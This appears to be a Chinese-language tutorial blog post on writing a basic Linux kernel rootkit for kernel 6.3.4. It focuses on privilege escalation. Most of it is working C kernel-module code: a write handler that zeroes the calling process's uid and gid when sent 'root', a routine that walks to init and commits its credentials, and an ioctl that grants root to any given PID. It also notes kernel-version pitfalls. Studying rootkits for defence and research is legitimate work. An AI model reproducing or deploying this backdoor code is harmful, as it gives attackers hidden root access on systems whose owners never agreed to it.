基础rootkit的编写
内核版本定为`linux-6.3.4`
# 行为
## 1. 提权

### 1.1. 直接修改cred
直接修改当前进程的cred结构体的uid, gid变量

```c
static ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
    static char user_data[0x100];
    struct cred * cur_cred;
    size_t size = count > 0x100 ? 0x100 : count;
    int flags;
    flags = copy_from_user(user_data, buf, size);
    if(!strncmp(user_data, "root", 4)){
        printk(KERN_INFO "Streight Modify the cred...");
        cur_cred = (struct cred *)current->cred;
        cur_cred->uid = cur_cred->euid = cur_cred->suid = cur_cred->fsuid = KUIDT_INIT(0);
        cur_cred->gid = cur_cred->egid = cur_cred->sgid = cur_cred->fsgid = KGIDT_INIT(0);
    }
    return size;
}
```

### 1.2. 内核pwn常用控制流

调用`commit_creds(prepare_kernel_cred(NULL))`
但是在实验过程中导致了内核异常退出
```c

struct cred *prepare_kernel_cred(struct task_struct *daemon)
{
	const struct cred *old;
	struct cred *new;

	if (WARN_ON_ONCE(!daemon))
		return NULL;
...
```
这里源码发现运行至此处会判断daemon是否为空,是则返回NULL,
而这样就导致`commit_creds`的参数为NULL, 然后在后面的代码执行过程中出现panic

但这招仍然在可控范围内，
因为我们使用`commit_creds`的目的就是为了提供一个拥有root权限的cred结构体，
而内核中初始化会存有一个静态的`init_creds`结构体供我们使用

```c
struct cred init_cred = {
	.usage			= ATOMIC_INIT(4),
#ifdef CONFIG_DEBUG_CREDENTIALS
	.subscribers		= ATOMIC_INIT(2),
	.magic			= CRED_MAGIC,
#endif
	.uid			= GLOBAL_ROOT_UID,
	.gid			= GLOBAL_ROOT_GID,
...
```

所以这里我选择直接复制这个结构体作为参数,但在编译过程当中失败，理由是未识别的`init_cred`,
那么这里就默认`init_cred`并未被导出

那么这里还可以直接根据当前进程来不断向上遍历父进程直到init进程，进而获得`init_cred`
如下:
```c

    }else if(!strncmp(user_data, "escalate", 8)){
        printk(KERN_INFO "[peiwithhao rootkit] Prepare kernel cred and commit...");
        /* 获取当前进程的task_struct */
        tsk = current;
        while(tsk != tsk->parent){
            tsk = tsk->parent;
        }
        /* 此时task变为init进程 */
        commit_creds((struct cred *)tsk->cred);
```

### 1.3. 提升指定进程权限

这里不难理解，只需要使用内核提供的函数`get_pid_task`就可以获取对应pid的task结构体，然后修改其中cred内容即可

```c
static int ioctl_giver(pid_t pid){
    struct pid *user_pid;
    struct task_struct *finded_task;
    struct cred * cur_cred;
        user_pid = find_get_pid(pid);
        if(IS_ERR(user_pid)){
            printk(KERN_INFO "[peiwithhao rootkit] Failed to find the pid...");
            return PTR_ERR(user_pid);
        }
    finded_task = get_pid_task(user_pid, PIDTYPE_PID);
        if(IS_ERR(finded_task)){
            printk(KERN_INFO "[peiwithhao rootkit] Failed to find the task_struct...");
            return PTR_ERR(finded_task);
        }
        cur_cred = (struct cred *)finded_task->cred;
        cur_cred->uid = cur_cred->euid = cur_cred->suid = cur_cred->fsuid = KUIDT_INIT(0);
        cur_cred->gid = cur_cred->egid = cur_cred->sgid = cur_cred->fsgid = KGIDT_INIT(0);
    return 0;
}
```



